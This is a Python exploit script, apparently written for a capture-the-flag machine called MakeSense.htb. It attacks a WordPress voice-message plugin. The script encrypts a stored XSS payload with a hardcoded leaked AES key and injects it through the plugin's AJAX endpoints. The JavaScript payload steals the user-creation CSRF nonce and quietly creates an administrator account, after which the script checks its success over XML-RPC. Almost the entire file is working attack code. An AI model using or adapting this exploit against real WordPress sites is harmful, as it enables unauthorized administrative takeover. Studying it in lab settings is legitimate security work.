#!/usr/bin/env python3
"""
What It Does (Quick Recap):

    Creates a voice post via save_voice_raw → gets post_id

    Encrypts XSS payload with stolen AES key

    Stores encrypted XSS via save_voice_results

    Admin bot visits /wp-admin/ → XSS fires

    XSS fetches /wp-admin/user-new.php → extracts CSRF nonce

    Creates new admin user pwned:MySecurePass123!


USAGE : python3 exploit.py pwned MySecurePass123!
MakeSense.htb Exploit - Admin Creation via Stored XSS 
"""

import requests
import json
import base64
import hashlib
import os
import sys
import time
import re
from Crypto.Cipher import AES

requests.packages.urllib3.disable_warnings()

class MakeSenseExploit:
    def __init__(self, target="https://makesense.htb", username="pwned", password="Pwn3r123!"):
        self.target = target.rstrip('/')
        self.ajax_url = f"{self.target}/wp-admin/admin-ajax.php"
        self.nonce = "4c58dec735"
        self.encryption_key = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = False
        
    def derive_key(self):
        return hashlib.sha256(self.encryption_key.encode()).digest()
    
    def encrypt_payload(self, payload_dict):
        plaintext = json.dumps(payload_dict).encode('utf-8')
        key = self.derive_key()
        iv = os.urandom(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        combined = iv + ciphertext + tag
        return base64.b64encode(combined).decode('utf-8')
    
    def create_voice_post(self):
        """Step 1: Create voice message post"""
        print("[*] Creating voice message post...")
        
        wav_header = (
            b'RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00'
            b'\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00'
        )
        
        files = {'voice_recording': ('voice-message.wav', wav_header, 'audio/wav')}
        data = {'action': 'save_voice_raw', 'nonce': self.nonce}
        
        try:
            response = self.session.post(self.ajax_url, data=data, files=files)
            result = response.json()
            if result.get('success'):
                post_id = result['data']['post_id']
                print(f"[+] Post ID: {post_id}")
                return post_id
            return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def inject_payload(self, post_id, xss_payload):
        """Inject XSS payload into voice post"""
        payload = {'transcription': xss_payload, 'summary': 'test'}
        encrypted = self.encrypt_payload(payload)
        data = {
            'action': 'save_voice_results',
            'nonce': self.nonce,
            'post_id': post_id,
            'encrypted_payload': encrypted
        }
        response = self.session.post(self.ajax_url, data=data)
        result = response.json()
        return result.get('success', False)
    
    def verify_admin(self, username, password):
        """Verify admin account exists"""
        xml = f"""<?xml version="1.0"?>
        <methodCall><methodName>wp.getUsersBlogs</methodName>
        <params><param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param></params></methodCall>"""
        
        try:
            response = self.session.post(
                f"{self.target}/xmlrpc.php", data=xml,
                headers={'Content-Type': 'text/xml'}
            )
            if 'isAdmin' in response.text and '<boolean>1</boolean>' in response.text:
                return True
            return False
        except:
            return False
    
    def exploit(self):
        print("="*60)
        print("MakeSense.htb - Admin Creation via Stored XSS")
        print("="*60)
        
        post_id = self.create_voice_post()
        if not post_id:
            return False
        
        # XSS Payload that creates admin user
        xss = f'''<script>
fetch('/wp-admin/user-new.php',{{credentials:'same-origin'}})
.then(r=>r.text())
.then(h=>{{
    var n=h.match(/_wpnonce_create-user" value="([^"]+)"/);
    if(n){{
        var f=new FormData();
        f.append('action','createuser');
        f.append('_wpnonce_create-user',n[1]);
        f.append('user_login','{self.username}');
        f.append('email','{self.username}@evil.com');
        f.append('pass1','{self.password}');
        f.append('pass2','{self.password}');
        f.append('role','administrator');
        fetch('/wp-admin/user-new.php',{{method:'POST',body:f,credentials:'same-origin'}});
    }}
}});
</script>'''
        
        self.inject_payload(post_id, xss)
        
        print("[*] Waiting for admin bot...")
        for i in range(12):
            time.sleep(10)
            if self.verify_admin(self.username, self.password):
                print(f"[+] SUCCESS! {self.username}:{self.password}")
                return True
        
        return False

if __name__ == "__main__":
    exploit = MakeSenseExploit(username="pwned", password="MySecurePass123!")
    exploit.exploit()
